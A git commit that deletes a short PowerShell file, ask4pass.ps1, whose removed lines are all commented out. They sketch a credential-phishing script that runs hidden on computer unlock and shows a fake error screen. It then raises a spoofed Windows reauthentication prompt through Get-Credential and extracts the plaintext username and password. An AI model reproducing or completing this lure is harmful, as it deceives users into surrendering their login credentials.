bdb1c65c769922e2979feb82d3f3893d960b4192
Argentum <46742063+silverwolf2r@users.noreply.github.com>
2026-05-23 11:45:43 -0600

    Delete ask4pass.ps1

--- ask4pass.ps1
+++
@@ -1,7 +0,0 @@
-#script needs to run on unlock of computer
-#run hidden
-#display complete error screen
-#Ask for Password
-#$credential = Get-Credential -Message "Windows failed to unlock your computer and needs to reauthenticate your connection."
-#$clipData1 = $credential.GetNetworkCredential().UserName
-#$clipData2 = $credential.GetNetworkCredential().Password 
